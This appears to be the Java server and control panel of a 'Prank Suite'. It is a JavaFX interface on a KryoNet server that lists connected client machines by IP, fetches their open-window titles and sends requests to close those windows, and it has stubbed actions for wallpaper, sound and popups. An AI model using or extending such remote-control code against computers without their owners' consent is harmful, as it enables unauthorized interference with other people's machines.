package me.toast.pranksuite;

import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Objects;

import com.esotericsoftware.kryonet.Server;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;

public class PSServer extends Application {

    //TODO Redo access levels

    public static Server SERVER;

    public static Button refresh;
    public static Button send;

    public static ListView<String> openWindows;
    private String selectedWindow;

    public static ListView<String> clientList;
    private String selectedClient;

    public static ListView<Action> actions;
    private Action selectedAction;

    public static List<String> fetchedWindows = new ArrayList<>();
    //TODO: Figure out better way getting Connection from IP
    public static HashMap<Integer, String> connectedClients = new HashMap<>();

    public static Label whatis3rdlist;

    public static Listener LISTENER = new Listener() {
        public void connected(Connection connection) {
            connectedClients.put(connection.getID(), connection.getRemoteAddressTCP().getHostString());
             Platform.runLater(() -> clientList.getItems().add(connection.getRemoteAddressTCP().getHostString()));
        }
        public void disconnected(Connection connection) {
            Platform.runLater(() -> {
                clientList.getItems().remove(connectedClients.get(connection.getID()));
                connectedClients.remove(connection.getID());
            });
        }
        public void received(Connection connection, Object object) {
            if (object instanceof Packets.OpenWindowsStartResponse) {
                System.out.println("Starting to receive OpenWindowsResponse packets!");
                fetchedWindows.clear();
            }
            if (object instanceof Packets.OpenWindowsResponse response) {
                fetchedWindows.add(response.openWindow);
            }
            if (object instanceof Packets.OpenWindowsFinalResponse) {
                Platform.runLater(() -> {
                    openWindows.getItems().clear();
                    openWindows.getItems().addAll(fetchedWindows);
                });
            }
        }
    };

    public static void main(String[] args) throws IOException {
        SERVER = new Server();
        Packets.RegisterPackets(SERVER.getKryo());
        Thread thread = new Thread(SERVER); thread.start();
        SERVER.bind(54555);
        SERVER.addListener(LISTENER);

        launch(args);
    }

    @Override
    public void start(Stage stage) {
        stage.setTitle("Prank Suite");
        stage.setResizable(false);

        refresh = new Button("Refresh");
        refresh.setOnAction(e -> {
            if (selectedAction == Action.WINDOW) {
                askForWindows(selectedClient);
            }
            if (selectedAction == Action.WALLPAPER) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.SOUND) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.POPUP) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.POPUP_HTML) {
                //askForWindows(selectedClient);
            }
        });

        send = new Button("Send");
        send.setOnAction(e -> {
            if (selectedAction == Action.WINDOW) {
                if (fetchedWindows.contains(selectedWindow)) {
                    Packets.CloseWindow request = new Packets.CloseWindow();
                    request.nameOfWindow = selectedWindow;
                    System.out.println("Sending Close Window Request...");
                    try {
                        Objects.requireNonNull(getConnectionFromIP(selectedClient)).sendTCP(request);
                    } catch (NullPointerException except) {
                        System.out.println("Client IP given was invalid!");
                    }
                    askForWindows(selectedClient);
                }
            }
            if (selectedAction == Action.WALLPAPER) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.SOUND) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.POPUP) {
                //askForWindows(selectedClient);
            }
            if (selectedAction == Action.POPUP_HTML) {
                //askForWindows(selectedClient);
            }
        });

//        changeBackground = new Button("Change Background");
//        changeBackground.setOnAction(e -> {
//            Packets.ChangeBackground request = new Packets.ChangeBackground();
//            System.out.println("Sending Change Background Request...");
//            try { Objects.requireNonNull(getConnectionFromIP(selectedClient)).sendTCP(request); } catch (NullPointerException except) {System.out.println("Client IP given was invalid!");}
//        });

//        createPopUp = new Button("Create Popup");
//        createPopUp.setOnAction(e -> {
//            Packets.TriggerPopup request = new Packets.TriggerPopup();
//            //TODO show in UI
//            request.title = "Title";
//            request.message = "Message";
//            request.button = "OK";
//            System.out.println("Sending Popup Request...");
//            try { Objects.requireNonNull(getConnectionFromIP(selectedClient)).sendTCP(request); } catch (NullPointerException except) {System.out.println("Client IP given was invalid!");}
//        });

        openWindows = new ListView<>();
        openWindows.setPrefWidth(300);
        openWindows.setPrefHeight(600);
        openWindows.setEditable(false);
        openWindows.getSelectionModel().selectedItemProperty().addListener((observableValue, oldValue, newValue) -> selectedWindow = newValue);

        clientList = new ListView<>();
        clientList.setPrefWidth(300);
        clientList.setPrefHeight(600);
        clientList.setEditable(false);
        clientList.getSelectionModel().selectedItemProperty().addListener((observableValue, oldValue, newValue) -> selectedClient = newValue);

        actions = new ListView<>();
        actions.setPrefWidth(300);
        actions.setPrefHeight(600);
        actions.setEditable(false);
        actions.getItems().addAll(Action.WINDOW, Action.WALLPAPER, Action.SOUND, Action.POPUP, Action.POPUP_HTML);
        actions.getSelectionModel().selectedItemProperty().addListener((observableValue, oldValue, newValue) -> {
            selectedAction = newValue;
            if (newValue == Action.WINDOW) {
                openWindows.getItems().clear();
                whatis3rdlist.setText("Open Windows   ");
                askForWindows(selectedClient);
            }
            if (newValue == Action.WALLPAPER) {
                whatis3rdlist.setText("Set Wallpaper   ");
                openWindows.getItems().clear();
            }
             if (newValue == Action.SOUND) {
                whatis3rdlist.setText("Play Sound   ");
                openWindows.getItems().clear();
            }if (newValue == Action.POPUP) {
                whatis3rdlist.setText("Trigger Popup   ");
                openWindows.getItems().clear();
            }
             if (newValue == Action.POPUP_HTML) {
                whatis3rdlist.setText("Trigger HTML Popup   ");
                openWindows.getItems().clear();
            }
        });

        whatis3rdlist = new Label("");

        VBox openHost = new VBox();
        openHost.setAlignment(Pos.BOTTOM_CENTER);
        HBox tmp = new HBox();
        tmp.setAlignment(Pos.BOTTOM_CENTER);
        tmp.getChildren().addAll(whatis3rdlist, send, refresh);
        openHost.getChildren().addAll(tmp, openWindows);

        VBox actionPanel = new VBox();
        actionPanel.setAlignment(Pos.BOTTOM_CENTER);
        actionPanel.getChildren().addAll(new Label("Actions"), actions);

        VBox clientPanel = new VBox();
        clientPanel.setAlignment(Pos.BOTTOM_CENTER);
        clientPanel.getChildren().addAll(new Label("Connected Clients"), clientList);

        BorderPane borderPane = new BorderPane();
        borderPane.setLeft(clientPanel);
        borderPane.setCenter(actionPanel);
        borderPane.setRight(openHost);

        Scene scene = new Scene(borderPane, 900, 650);
        stage.setScene(scene);
        stage.show();
    }

    public void askForWindows(String ip) {
        Packets.OpenWindowsRequest request = new Packets.OpenWindowsRequest();
        System.out.println("Sending Window Request...");
        try { Objects.requireNonNull(getConnectionFromIP(ip)).sendTCP(request); } catch (NullPointerException except) {System.out.println("IP given was invalid!");}
    }

    public static Connection getConnectionFromIP(String ip) {
        for (int i = 0; i < SERVER.getConnections().length; i++)
            if(SERVER.getConnections()[i].getRemoteAddressTCP().getHostString().equals(ip))
                return SERVER.getConnections()[i];
        return null;
    }

    @Override
    public void stop() throws Exception {
        SERVER.stop();
        super.stop();
    }
}
